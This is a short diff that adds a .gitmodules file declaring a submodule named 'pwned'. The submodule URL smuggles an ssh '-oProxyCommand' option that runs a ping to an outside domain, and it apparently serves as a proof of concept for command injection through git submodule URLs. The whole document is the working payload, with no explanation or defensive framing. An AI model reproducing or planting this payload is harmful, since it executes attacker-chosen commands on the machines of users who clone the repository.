@@ -1,0 +1,3 @@
+[submodule "pwned"]
+path = pwned
+url = ssh://-oProxyCommand='ping sssssss.a.blueotter.info'/
